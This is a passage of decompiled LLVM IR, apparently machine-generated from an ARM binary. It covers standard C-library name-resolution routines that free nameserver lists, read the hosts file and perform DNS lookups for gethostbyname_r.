  uselistorder i32 -33204, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -33204), { 1, 0 }
  uselistorder i32 14412, { 0, 2, 1, 3 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_167ec, { 7, 6, 3, 4, 5, 0, 1, 2 }
  uselistorder label %dec_label_pc_1675c, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_16710, { 1, 0 }
  uselistorder label %dec_label_pc_16708, { 1, 0 }
  uselistorder label %dec_label_pc_165cc, { 1, 0 }
  uselistorder label %dec_label_pc_166ec.backedge, { 4, 10, 8, 7, 9, 0, 1, 2, 3, 6, 5 }
  uselistorder label %dec_label_pc_16448, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
}

define i32 @__close_nameservers() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16854 = load i32, i32* @r4, align 4
  store i32 %v3_16854, i32* %stack_var_-20, align 4
  store i32 14420, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r5, align 4
  store i32 -33128, i32* %r3.global-to-local, align 4
  %v4_16868 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 14420) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -33128), i32* %r3.global-to-local, align 4
  store i32 92284, i32* @lr, align 4
  %v1_16878 = icmp ne i32 %v4_16868, add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -33128)
  call void @__pseudo_cond_branch(i1 %v1_16878, i32 ptrtoint (i32* @global_var_f3b8.198 to i32))
  store i32 14424, i32* %r3.global-to-local, align 4
  store i32 14428, i32* @r7, align 4
  store i32 14416, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_1688c = load i32, i32* @r5, align 4
  %v3_1688c = add i32 %v1_1688c, 14424
  %v4_1688c = inttoptr i32 %v3_1688c to i32*
  store i32 0, i32* %v4_1688c, align 4
  %v0_16890 = load i32, i32* %r2.global-to-local, align 4
  %v1_16890 = load i32, i32* @r5, align 4
  %v2_16890 = load i32, i32* %r4.global-to-local, align 4
  %v3_16890 = add i32 %v2_16890, %v1_16890
  %v4_16890 = inttoptr i32 %v3_16890 to i32*
  store i32 %v0_16890, i32* %v4_16890, align 4
  br label %dec_label_pc_168a8

dec_label_pc_16898:                               ; preds = %dec_label_pc_168a8
  store i32 %v4_168bc, i32* %r3.global-to-local, align 4
  store i32 %v1_168b0, i32* %v3_168a8, align 4
  %v0_168a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_168a0 = load i32, i32* %r2.global-to-local, align 4
  %v4_168a0 = mul i32 %v1_168a0, 4
  %v5_168a0 = add i32 %v4_168a0, %v0_168a0
  %v6_168a0 = inttoptr i32 %v5_168a0 to i32*
  %v7_168a0 = load i32, i32* %v6_168a0, align 4
  store i32 %v7_168a0, i32* @r0, align 4
  %v0_168a4 = call i32 @free()
  br label %dec_label_pc_168a8

dec_label_pc_168a8:                               ; preds = %entry, %dec_label_pc_16898
  %v0_168a8 = load i32, i32* @r5, align 4
  %v1_168a8 = load i32, i32* @r7, align 4
  %v2_168a8 = add i32 %v1_168a8, %v0_168a8
  %v3_168a8 = inttoptr i32 %v2_168a8 to i32*
  %v4_168a8 = load i32, i32* %v3_168a8, align 4
  store i32 %v4_168a8, i32* @r4, align 4
  %v2_168ac = icmp eq i32 %v4_168a8, 0
  %v1_168b0 = add i32 %v4_168a8, -1
  store i32 %v1_168b0, i32* %r2.global-to-local, align 4
  %v0_168b4 = load i32, i32* @r6, align 4
  store i32 %v0_168b4, i32* %r3.global-to-local, align 4
  %v2_168bc = add i32 %v0_168b4, %v0_168a8
  %v3_168bc = inttoptr i32 %v2_168bc to i32*
  %v4_168bc = load i32, i32* %v3_168bc, align 4
  br i1 %v2_168ac, label %dec_label_pc_168bc, label %dec_label_pc_16898

dec_label_pc_168bc:                               ; preds = %dec_label_pc_168a8
  store i32 %v4_168bc, i32* @r0, align 4
  %v0_168c0 = call i32 @free()
  %v0_168c4 = load i32, i32* @r4, align 4
  %v1_168c4 = load i32, i32* @r5, align 4
  %v2_168c4 = load i32, i32* @r6, align 4
  %v3_168c4 = add i32 %v2_168c4, %v1_168c4
  %v4_168c4 = inttoptr i32 %v3_168c4 to i32*
  store i32 %v0_168c4, i32* %v4_168c4, align 4
  %v2_168cc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_168cc, i32* %r4.global-to-local, align 4
  ret i32 %v0_168c0

; uselistorder directives
  uselistorder i32 %v4_168bc, { 1, 0 }
  uselistorder i32 %v1_168b0, { 1, 0 }
  uselistorder i32* %v3_168a8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 14416, { 3, 1, 6, 4, 5, 0, 2 }
  uselistorder i32 14428, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 14424, { 0, 1, 3, 7, 4, 8, 2, 6, 5, 9, 10, 12, 11, 13 }
  uselistorder i32 -33128, { 1, 2, 0, 3 }
  uselistorder i32 14420, { 4, 5, 1, 0, 7, 2, 6, 3, 8 }
  uselistorder label %dec_label_pc_168a8, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1) local_unnamed_addr {
entry:
  %v0_168ec = load i32, i32* @lr, align 4
  %v0_168f8 = load i32, i32* @r1, align 4
  store i32 %v0_168f8, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %v0_168f8, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_16928 = call i32 @__read_etc_hosts_r()
  store i32 %v0_168ec, i32* @lr, align 4
  ret i32 %v0_16928
}

define i32 @gethostbyname_r() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp28, i32* %stack_var_0, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_16940 = load i32, i32* @r1, align 4
  store i32 %v0_16940, i32* @r7, align 4
  store i32 %tmp28, i32* @r1, align 4
  store i32 0, i32* @r5, align 4
  %v0_1694c = load i32, i32* @r0, align 4
  store i32 %v0_1694c, i32* @fp, align 4
  %v2_1694c = icmp eq i32 %v0_1694c, 0
  %v2_16950 = inttoptr i32 %tmp28 to i32*
  store i32 0, i32* %v2_16950, align 4
  %v0_16954 = load i32, i32* @r2, align 4
  %v0_16958 = load i32, i32* @r3, align 4
  store i32 %v0_16958, i32* @r6, align 4
  br i1 %v2_1694c, label %bb, label %dec_label_pc_16964

bb:                                               ; preds = %entry
  %v1_1695c = load i32, i32* @r5, align 4
  %v2_1695c = add i32 %v1_1695c, 22
  store i32 %v2_1695c, i32* @r5, align 4
  br label %dec_label_pc_16c54

dec_label_pc_16964:                               ; preds = %entry
  store i32 51176, i32* %r3.global-to-local, align 4
  store i32 51172, i32* %r2.global-to-local, align 4
  %v0_1696c = call i32 @__aeabi_read_tp()
  store i32 %v0_1696c, i32* %r0.global-to-local, align 4
  %v3_16974 = load i16, i16* @global_var_23164.175, align 2
  %v4_16974 = sext i16 %v3_16974 to i32
  store i32 %v4_16974, i32* %r3.global-to-local, align 4
  store i32 %v4_16974, i32* %r2.global-to-local, align 4
  %v2_1697c = add i32 %v4_16974, %v0_1696c
  %v3_1697c = inttoptr i32 %v2_1697c to i32*
  %v4_1697c = load i32, i32* %v3_1697c, align 4
  store i32 %v4_1697c, i32* @r8, align 4
  %v0_16980 = load i32, i32* @r5, align 4
  store i32 %v0_16980, i32* %v3_1697c, align 4
  store i32 %v0_1696c, i32* @r4, align 4
  store i32 2, i32* @r1, align 4
  %v0_16994 = load i32, i32* @fp, align 4
  store i32 %v0_16994, i32* %r0.global-to-local, align 4
  %v0_16998 = load i32, i32* @r7, align 4
  store i32 %v0_16998, i32* %r2.global-to-local, align 4
  store i32 %v0_16954, i32* %r3.global-to-local, align 4
  %v1_169a8 = call i32 @__get_hosts_byname_r(i32 %v0_16994)
  store i32 %v1_169a8, i32* %r0.global-to-local, align 4
  store i32 %v1_169a8, i32* @r5, align 4
  %v2_169ac = icmp eq i32 %v1_169a8, 0
  br i1 %v2_169ac, label %.thread4, label %dec_label_pc_169c0

.thread4:                                         ; preds = %dec_label_pc_16964
  store i32 51112, i32* %r3.global-to-local, align 4
  %v4_169b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_169bc.671 to i32), i32 51112) to i32*), align 4
  store i32 %v4_169b4, i32* %r3.global-to-local, align 4
  %v1_169b8 = load i32, i32* @r8, align 4
  %v2_169b8 = load i32, i32* @r4, align 4
  %v4_169b8 = add i32 %v2_169b8, %v4_169b4
  %v5_169b8 = inttoptr i32 %v4_169b8 to i32*
  store i32 %v1_169b8, i32* %v5_169b8, align 4
  br label %dec_label_pc_16c54

dec_label_pc_169c0:                               ; preds = %dec_label_pc_16964
  store i32 %tmp17, i32* @r1, align 4
  %v1_169c4 = inttoptr i32 %tmp17 to i32*
  %v2_169c4 = load i32, i32* %v1_169c4, align 4
  store i32 %v2_169c4, i32* %r3.global-to-local, align 4
  %v7_169c8 = icmp eq i32 %v2_169c4, 1
  br i1 %v7_169c8, label %dec_label_pc_169e4, label %dec_label_pc_169d0

dec_label_pc_169d0:                               ; preds = %dec_label_pc_169c0
  %v7_169d0 = icmp eq i32 %v2_169c4, 4
  br i1 %v7_169d0, label %dec_label_pc_16a0c, label %dec_label_pc_169d8

dec_label_pc_169d8:                               ; preds = %dec_label_pc_169d0
  %v3_169d8 = icmp eq i32 %v2_169c4, -1
  br i1 %v3_169d8, label %dec_label_pc_169f8, label %dec_label_pc_16c54

dec_label_pc_169e4:                               ; preds = %dec_label_pc_169c0
  %v7_169e4 = icmp eq i32 %v1_169a8, 2
  br i1 %v7_169e4, label %.thread6, label %bb33

bb33:                                             ; preds = %dec_label_pc_169e4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_16a14

.thread6:                                         ; preds = %dec_label_pc_169e4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_16a14

dec_label_pc_169f8:                               ; preds = %dec_label_pc_169d8
  %v3_169fc = load i16, i16* @global_var_23164.175, align 2
  %v4_169fc = sext i16 %v3_169fc to i32
  store i32 %v4_169fc, i32* %r3.global-to-local, align 4
  %v0_16a00 = load i32, i32* @r4, align 4
  %v2_16a00 = add i32 %v0_16a00, %v4_169fc
  %v3_16a00 = inttoptr i32 %v2_16a00 to i32*
  %v4_16a00 = load i32, i32* %v3_16a00, align 4
  store i32 %v4_16a00, i32* %r3.global-to-local, align 4
  %v7_16a04 = icmp eq i32 %v4_16a00, 2
  br i1 %v7_16a04, label %dec_label_pc_16a0c, label %dec_label_pc_16c54

dec_label_pc_16a0c:                               ; preds = %dec_label_pc_169f8, %dec_label_pc_169d0
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16a14

dec_label_pc_16a14:                               ; preds = %.thread6, %bb33, %dec_label_pc_16a0c
  %storemerge2 = phi i32 [ 0, %dec_label_pc_16a0c ], [ 0, %bb33 ], [ 1, %.thread6 ]
  store i32 51008, i32* %r3.global-to-local, align 4
  %v0_16a18 = call i32 @__aeabi_read_tp()
  %v3_16a1c = load i16, i16* @global_var_23164.175, align 2
  %v4_16a1c = sext i16 %v3_16a1c to i32
  store i32 %tmp17, i32* @ip, align 4
  %v0_16a24 = load i32, i32* @r8, align 4
  %v3_16a24 = add i32 %v4_16a1c, %v0_16a18
  %v4_16a24 = inttoptr i32 %v3_16a24 to i32*
  store i32 %v0_16a24, i32* %v4_16a24, align 4
  store i32 -1, i32* @r3, align 4
  %v1_16a30 = load i32, i32* @ip, align 4
  %v2_16a30 = inttoptr i32 %v1_16a30 to i32*
  store i32 -1, i32* %v2_16a30, align 4
  %v0_16a34 = load i32, i32* @fp, align 4
  %v1_16a34 = inttoptr i32 %v0_16a34 to i8*
  store i32 %v0_16a34, i32* %r0.global-to-local, align 4
  %v3_16a38 = call i32 @strlen(i8* %v1_16a34)
  store i32 %v3_16a38, i32* %r0.global-to-local, align 4
  %v1_16a3c = add i32 %v3_16a38, 1
  store i32 %v1_16a3c, i32* @r4, align 4
  %v0_16a40 = load i32, i32* @r6, align 4
  %v7_16a44 = icmp sgt i32 %v0_16a40, %v1_16a3c
  br i1 %v7_16a44, label %dec_label_pc_16a48, label %dec_label_pc_16c50

dec_label_pc_16a48:                               ; preds = %dec_label_pc_16a14
  %v0_16a48 = load i32, i32* @fp, align 4
  store i32 %v0_16a48, i32* @r1, align 4
  store i32 %v1_16a3c, i32* @r2, align 4
  store i32 %v0_16954, i32* @r0, align 4
  %v0_16a54 = call i32 @memcpy()
  store i32 %v0_16a54, i32* %r0.global-to-local, align 4
  %v1_16a5c = load i32, i32* @r4, align 4
  %v2_16a5c = add i32 %v1_16a5c, %v0_16954
  store i32 %v2_16a5c, i32* @r1, align 4
  %v1_16a60 = sub i32 0, %v2_16a5c
  %v1_16a64 = load i32, i32* @r6, align 4
  %v2_16a64 = sub i32 %v1_16a64, %v1_16a5c
  store i32 %v2_16a64, i32* %r2.global-to-local, align 4
  %v1_16a68 = urem i32 %v1_16a60, 4
  store i32 %v1_16a68, i32* %r3.global-to-local, align 4
  %v2_16a6c = sub i32 %v2_16a64, %v1_16a68
  store i32 %v2_16a6c, i32* @sl, align 4
  %v1_16a70 = add i32 %v2_16a6c, -8
  store i32 %v1_16a70, i32* @r5, align 4
  %v7_16a78 = icmp slt i32 %v1_16a70, 256
  br i1 %v7_16a78, label %dec_label_pc_16c50, label %dec_label_pc_16a7c

dec_label_pc_16a7c:                               ; preds = %dec_label_pc_16a48
  %v2_16a7c = add i32 %v1_16a68, %v2_16a5c
  store i32 %v2_16a7c, i32* @sb, align 4
  store i32 %v0_16954, i32* @ip, align 4
  %v1_16a84 = add i32 %v2_16a7c, 8
  store i32 %v1_16a84, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  %v1_16a8c = add i32 %v2_16a7c, 16
  store i32 %v1_16a8c, i32* @r8, align 4
  %v4_16a90 = inttoptr i32 %v2_16a7c to i32*
  store i32 %v0_16954, i32* %v4_16a90, align 4
  %v0_16a94 = load i32, i32* @fp, align 4
  store i32 %v0_16a94, i32* %r0.global-to-local, align 4
  %v0_16a98 = load i32, i32* @r4, align 4
  %v1_16a98 = load i32, i32* @sb, align 4
  %v2_16a98 = add i32 %v1_16a98, 4
  %v3_16a98 = inttoptr i32 %v2_16a98 to i32*
  store i32 %v0_16a98, i32* %v3_16a98, align 4
  %v0_16a9c = load i32, i32* @r8, align 4
  %v2_16aa0 = inttoptr i32 %v0_16a94 to i8*
  %v3_16aa0 = call i32 @inet_aton(i8* %v2_16aa0, i32 %v0_16a9c)
  store i32 %v3_16aa0, i32* %r0.global-to-local, align 4
  %v1_16aa4 = load i32, i32* @r4, align 4
  %v9_16aa4 = icmp eq i32 %v3_16aa0, %v1_16aa4
  br i1 %v9_16aa4, label %dec_label_pc_16ae8, label %dec_label_pc_16aac

dec_label_pc_16aac:                               ; preds = %dec_label_pc_16a7c
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_16ab0 = load i32, i32* @r7, align 4
  %v2_16ab0 = add i32 %v1_16ab0, 8
  %v3_16ab0 = inttoptr i32 %v2_16ab0 to i32*
  store i32 2, i32* %v3_16ab0, align 4
  %v0_16ab4 = load i32, i32* %r3.global-to-local, align 4
  %v2_16ab4 = mul i32 %v0_16ab4, 2
  %v1_16ab8 = load i32, i32* @r7, align 4
  %v2_16ab8 = add i32 %v1_16ab8, 12
  %v3_16ab8 = inttoptr i32 %v2_16ab8 to i32*
  store i32 %v2_16ab4, i32* %v3_16ab8, align 4
  %v3_16abc = load i32, i32* %stack_var_0, align 4
  store i32 %v3_16abc, i32* @r1, align 4
  store i32 %v0_16954, i32* %r2.global-to-local, align 4
  store i32 %tmp17, i32* %r3.global-to-local, align 4
  %v0_16ac8 = load i32, i32* @r4, align 4
  store i32 %v0_16ac8, i32* @r5, align 4
  %v0_16acc = load i32, i32* @r8, align 4
  %v1_16acc = load i32, i32* @sb, align 4
  %v2_16acc = add i32 %v1_16acc, 8
  %v3_16acc = inttoptr i32 %v2_16acc to i32*
  store i32 %v0_16acc, i32* %v3_16acc, align 4
  %v0_16ad0 = load i32, i32* @r7, align 4
  %v1_16ad0 = load i32, i32* @r1, align 4
  %v2_16ad0 = inttoptr i32 %v1_16ad0 to i32*
  store i32 %v0_16ad0, i32* %v2_16ad0, align 4
  %v0_16ad4 = load i32, i32* @r7, align 4
  %v1_16ad4 = inttoptr i32 %v0_16ad4 to i32*
  %v2_16ad4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_16ad4, i32* %v1_16ad4, align 4
  %v3_16ad4 = add i32 %v0_16ad4, 4
  %v4_16ad4 = inttoptr i32 %v3_16ad4 to i32*
  %v5_16ad4 = load i32, i32* @sb, align 4
  store i32 %v5_16ad4, i32* %v4_16ad4, align 4
  %v0_16ad8 = load i32, i32* @r6, align 4
  %v1_16ad8 = load i32, i32* @r7, align 4
  %v2_16ad8 = add i32 %v1_16ad8, 16
  %v3_16ad8 = inttoptr i32 %v2_16ad8 to i32*
  store i32 %v0_16ad8, i32* %v3_16ad8, align 4
  %v0_16adc = load i32, i32* @r4, align 4
  %v1_16adc = load i32, i32* %r3.global-to-local, align 4
  %v2_16adc = inttoptr i32 %v1_16adc to i32*
  store i32 %v0_16adc, i32* %v2_16adc, align 4
  %v0_16ae0 = load i32, i32* @r4, align 4
  %v1_16ae0 = load i32, i32* @r6, align 4
  %v2_16ae0 = add i32 %v1_16ae0, 4
  %v3_16ae0 = inttoptr i32 %v2_16ae0 to i32*
  store i32 %v0_16ae0, i32* %v3_16ae0, align 4
  br label %dec_label_pc_16c54

dec_label_pc_16ae8:                               ; preds = %dec_label_pc_16a7c
  store i32 %storemerge2, i32* @ip, align 4
  %v2_16aec = icmp eq i32 %storemerge2, 0
  br i1 %v2_16aec, label %dec_label_pc_16af4, label %dec_label_pc_16b24

dec_label_pc_16af4:                               ; preds = %dec_label_pc_16ae8
  %v0_16b00 = load i32, i32* @fp, align 4
  store i32 %v0_16b00, i32* %r0.global-to-local, align 4
  %v2_16b08 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_16b08, i32* %r2.global-to-local, align 4
  %v2_16b0c = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_16b0c, i32* %r3.global-to-local, align 4
  %v7_16b18 = inttoptr i32 %v0_16b00 to i8*
  %v8_16b18 = call i32 @__dns_lookup(i8* %v7_16b18, i32 1, i32 %v2_16b08, i32 %v2_16b0c)
  store i32 %v8_16b18, i32* %r0.global-to-local, align 4
  %v1_16b1c = icmp slt i32 %v8_16b18, 0
  br i1 %v1_16b1c, label %dec_label_pc_16b24, label %dec_label_pc_16b38

dec_label_pc_16b24:                               ; preds = %dec_label_pc_16af4, %dec_label_pc_16ae8
  store i32 %tmp17, i32* @r1, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_169c4, align 4
  br label %dec_label_pc_16c54

dec_label_pc_16b38:                               ; preds = %dec_label_pc_16af4
  store i32 %tmp10, i32* %r3.global-to-local, align 4
  %v7_16b3c = icmp eq i32 %tmp10, 1
  br i1 %v7_16b3c, label %dec_label_pc_16b44, label %dec_label_pc_16c1c

dec_label_pc_16b44:                               ; preds = %dec_label_pc_16b38
  store i32 0, i32* @r2, align 4
  store i32 12, i32* @r4, align 4
  store i32 12, i32* @r3, align 4
  %v0_16b5c = load i32, i32* @r5, align 4
  %v2_16b5c = add i32 %v0_16b5c, -12
  store i32 %v2_16b5c, i32* @r8, align 4
  %v8_16b5c = icmp slt i32 %v2_16b5c, 0
  br i1 %v8_16b5c, label %bb35, label %dec_label_pc_16b68

bb35:                                             ; preds = %dec_label_pc_16b44
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_16c3c

dec_label_pc_16b68:                               ; preds = %dec_label_pc_16b44
  %v0_16b68 = load i32, i32* @r6, align 4
  store i32 %v0_16b68, i32* @r1, align 4
  %v2_16b6c = add i32 %v0_16b68, 12
  store i32 %v2_16b6c, i32* @r0, align 4
  %v2_16b70 = call i32 @memmove(i32 %v2_16b6c, i32 %v0_16b68)
  %v0_16b74 = load i32, i32* @sb, align 4
  %v1_16b74 = add i32 %v0_16b74, 4
  store i32 %v1_16b74, i32* @r3, align 4
  %v1_16b78 = load i32, i32* @r4, align 4
  %v2_16b78 = add i32 %v1_16b78, %v1_16b74
  store i32 %v2_16b78, i32* @r5, align 4
  store i32 %v2_16b78, i32* @r0, align 4
  store i32 4, i32* @r2, align 4
  %v0_16b88 = call i32 @memcpy()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_16b94.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16b94

dec_label_pc_16b94:                               ; preds = %dec_label_pc_16b68, %dec_label_pc_16b94
  %v0_16b94 = phi i32 [ %v0_16b94.pre, %dec_label_pc_16b68 ], [ %v1_16b98, %dec_label_pc_16b94 ]
  %v1_16b94 = load i32, i32* @r6, align 4
  %v7_16b94 = inttoptr i32 %v1_16b94 to i32*
  store i32 %v0_16b94, i32* %v7_16b94, align 4
  %v0_16b98 = load i32, i32* @r5, align 4
  %v1_16b98 = add i32 %v0_16b98, 4
  store i32 %v1_16b98, i32* @r5, align 4
  %v0_16b9c = load i32, i32* %r0.global-to-local, align 4
  %v1_16b9c = add i32 %v0_16b9c, 1
  store i32 %v1_16b9c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v9_16ba4 = icmp eq i32 %v1_16b9c, 0
  br i1 %v9_16ba4, label %dec_label_pc_16b94, label %dec_label_pc_16bac

dec_label_pc_16bac:                               ; preds = %dec_label_pc_16b94
  %v3_16bac = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_16bac, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_16bb4 = icmp eq i32 %v3_16bac, 0
  %v1_16bb8 = load i32, i32* @r6, align 4
  %v5_16bb8 = mul i32 %v1_16b9c, 4
  %v6_16bb8 = add i32 %v1_16bb8, %v5_16bb8
  %v7_16bb8 = inttoptr i32 %v6_16bb8 to i32*
  store i32 0, i32* %v7_16bb8, align 4
  br i1 %v2_16bb4, label %dec_label_pc_16be8, label %dec_label_pc_16bc0

dec_label_pc_16bc0:                               ; preds = %dec_label_pc_16bac
  %v0_16bc0 = load i32, i32* @r4, align 4
  %v1_16bc0 = inttoptr i32 %v0_16bc0 to i8*
  store i32 %v0_16bc0, i32* %r0.global-to-local, align 4
  %v3_16bc4 = call i32 @strlen(i8* %v1_16bc0)
  store i32 %v3_16bc4, i32* %r0.global-to-local, align 4
  %v0_16bc8 = load i32, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_16bc8, %v3_16bc4
  br i1 %tmp, label %dec_label_pc_16bd0, label %dec_label_pc_16be8

dec_label_pc_16bd0:                               ; preds = %dec_label_pc_16bc0
  %v0_16bd0 = load i32, i32* @r4, align 4
  store i32 %v0_16bd0, i32* @r1, align 4
  %v0_16bd4 = load i32, i32* @r5, align 4
  store i32 %v0_16bd4, i32* %r0.global-to-local, align 4
  %v2_16bd8 = inttoptr i32 %v0_16bd4 to i8*
  %v3_16bd8 = call i32 @strcpy(i8* %v2_16bd8, i32 %v0_16bd0)
  store i32 %v3_16bd8, i32* %r0.global-to-local, align 4
  %v0_16bdc = load i32, i32* @r5, align 4
  br label %dec_label_pc_16be8

dec_label_pc_16be8:                               ; preds = %dec_label_pc_16bc0, %dec_label_pc_16bac, %dec_label_pc_16bd0
  %storemerge1 = phi i32 [ %v0_16bdc, %dec_label_pc_16bd0 ], [ %v0_16954, %dec_label_pc_16bc0 ], [ %v0_16954, %dec_label_pc_16bac ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  %v3_16be8 = load i32, i32* %stack_var_0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_16bf0 = load i32, i32* @r7, align 4
  %v2_16bf0 = inttoptr i32 %v3_16be8 to i32*
  store i32 %v0_16bf0, i32* %v2_16bf0, align 4
  store i32 %tmp17, i32* @ip, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_16bfc = load i32, i32* @r7, align 4
  %v2_16bfc = add i32 %v1_16bfc, 8
  %v3_16bfc = inttoptr i32 %v2_16bfc to i32*
  store i32 2, i32* %v3_16bfc, align 4
  %v0_16c00 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_16c00, i32* @r5, align 4
  %v0_16c04 = load i32, i32* %r2.global-to-local, align 4
  %v2_16c04 = mul i32 %v0_16c04, 2
  store i32 %v2_16c04, i32* %r2.global-to-local, align 4
  %v1_16c08 = load i32, i32* @r7, align 4
  %v2_16c08 = add i32 %v1_16c08, 12
  %v3_16c08 = inttoptr i32 %v2_16c08 to i32*
  store i32 %v2_16c04, i32* %v3_16c08, align 4
  %v0_16c0c = load i32, i32* @r7, align 4
  %v1_16c0c = inttoptr i32 %v0_16c0c to i32*
  %v2_16c0c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_16c0c, i32* %v1_16c0c, align 4
  %v3_16c0c = add i32 %v0_16c0c, 4
  %v4_16c0c = inttoptr i32 %v3_16c0c to i32*
  %v5_16c0c = load i32, i32* @sb, align 4
  store i32 %v5_16c0c, i32* %v4_16c0c, align 4
  %v0_16c10 = load i32, i32* @r6, align 4
  %v1_16c10 = load i32, i32* @r7, align 4
  %v2_16c10 = add i32 %v1_16c10, 16
  %v3_16c10 = inttoptr i32 %v2_16c10 to i32*
  store i32 %v0_16c10, i32* %v3_16c10, align 4
  %v0_16c14 = load i32, i32* %r3.global-to-local, align 4
  %v1_16c14 = load i32, i32* @ip, align 4
  %v2_16c14 = inttoptr i32 %v1_16c14 to i32*
  store i32 %v0_16c14, i32* %v2_16c14, align 4
  br label %dec_label_pc_16c3c

dec_label_pc_16c1c:                               ; preds = %dec_label_pc_16b38
  store i32 %tmp17, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %v1_169c4, align 4
  store i32 %v0_16a18, i32* @ip, align 4
  %v3_16c30 = load i32, i32* @global_var_23120.283, align 4
  store i32 %v3_16c30, i32* %r3.global-to-local, align 4
  %v0_16c34 = load i32, i32* %r2.global-to-local, align 4
  %v3_16c34 = add i32 %v3_16c30, %v0_16a18
  %v4_16c34 = inttoptr i32 %v3_16c34 to i32*
  store i32 %v0_16c34, i32* %v4_16c34, align 4
  store i32 2, i32* @r5, align 4
  br label %dec_label_pc_16c3c

dec_label_pc_16c3c:                               ; preds = %bb35, %dec_label_pc_16be8, %dec_label_pc_16c1c
  %v3_16c3c = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_16c3c, i32* @r0, align 4
  %v0_16c40 = call i32 @free()
  %v3_16c44 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_16c44, i32* @r0, align 4
  %v0_16c48 = call i32 @free()
  store i32 %v0_16c48, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16c54

dec_label_pc_16c50:                               ; preds = %dec_label_pc_16a14, %dec_label_pc_16a48
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_16c54

dec_label_pc_16c54:                               ; preds = %bb, %.thread4, %dec_label_pc_169f8, %dec_label_pc_169d8, %dec_label_pc_16c3c, %dec_label_pc_16b24, %dec_label_pc_16aac, %dec_label_pc_16c50
  %v0_16c54 = load i32, i32* @r5, align 4
  store i32 %v0_16c54, i32* %r0.global-to-local, align 4
  ret i32 %v0_16c54

; uselistorder directives
  uselistorder i32 %v2_16c04, { 1, 0 }
  uselistorder i32 %v0_16bc0, { 1, 0 }
  uselistorder i32 %v1_16b9c, { 0, 2, 1 }
  uselistorder i32 %v1_16b98, { 1, 0 }
  uselistorder i32 %v0_16b68, { 1, 0, 2 }
  uselistorder i32 %v2_16b5c, { 1, 0 }
  uselistorder i32 %v1_16a68, { 2, 1, 0 }
  uselistorder i32 %v1_16a5c, { 1, 0 }
  uselistorder i32 %v0_16a34, { 1, 0 }
  uselistorder i32 %v0_16a18, { 0, 2, 1 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32* %v1_169c4, { 1, 0, 2 }
  uselistorder i32 %v0_1696c, { 1, 0, 2 }
  uselistorder i32 %v0_16954, { 1, 2, 3, 5, 4, 0, 6, 7 }
  uselistorder i32 %v0_1694c, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32 %tmp17, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 17, 18, 3, 2, 5, 4, 6, 19, 20, 8, 7, 10, 9, 11, 13, 12, 15, 14, 16 }
